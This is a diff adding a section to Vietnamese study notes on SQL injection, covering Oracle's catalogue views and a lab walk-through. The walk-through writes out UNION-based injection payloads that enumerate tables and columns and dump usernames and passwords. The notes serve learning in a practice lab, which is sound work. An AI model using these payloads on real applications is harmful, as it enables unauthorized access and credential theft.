@@ -422,3 +422,37 @@ Có thông tin rồi thì cứ theo dấu vết mà truy:
 ![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-4.png)
 ![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-5.png)
 ![img](../asset/sqli-9-SQL-injection-attack-listing-the-database-contents-on-non-Oracle-databases-6.png)
+
+3. _Equivalent to information schema on Oracle_
+
+   > Trên Oracle, có thể lấy thông tin toàn bộ table:
+
+   ```
+   SELECT * FROM all_tables
+   ```
+
+   Truy vấn các column:
+
+   ```
+   SELECT * FROM all_tab_columns WHERE table_name = 'USERS'
+   ```
+
+   ### Lab: SQL injection attack, listing the database contents on Oracle
+
+   > Des: Phòng thí nghiệm này chứa lỗ hổng SQL injection trong bộ lọc danh mục sản phẩm. Kết quả từ truy vấn được trả về trong phản hồi của ứng dụng, do đó bạn có thể sử dụng một cuộc tấn công UNION để lấy dữ liệu từ các bảng khác.
+
+   > Ứng dụng có chức năng đăng nhập và cơ sở dữ liệu chứa một bảng chứa tên người dùng và mật khẩu. Bạn cần xác định tên của bảng này và các cột mà nó chứa, sau đó truy xuất nội dung của bảng để lấy tên người dùng và mật khẩu của tất cả người dùng.
+
+   > Để giải quyết phòng thí nghiệm, hãy đăng nhập với tư cách là người dùng quản trị viên.
+
+   Check các cột và type:
+   ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-0.png) ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-1.png)
+
+   Lấy hết tên của các table ra `' UNION SELECT table_name, NULL FROM all_tables--`:
+   ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-2.png)
+
+   Lấy cột của table vừa nhận được `' UNION SELECT column_name, NULL FROM all_tab_columns WHERE table_name='USERS_abc'--`:
+   ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-3.png) ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-4.png)
+
+   Lấy data `' UNION SELECT USERNAME_abc, PASSWORD_abc FROM USERS_abd--`:
+   ![img](../asset/sqli-10-SQL-injection-attack-listing-the-database-contents-on-Oracle-5.png)
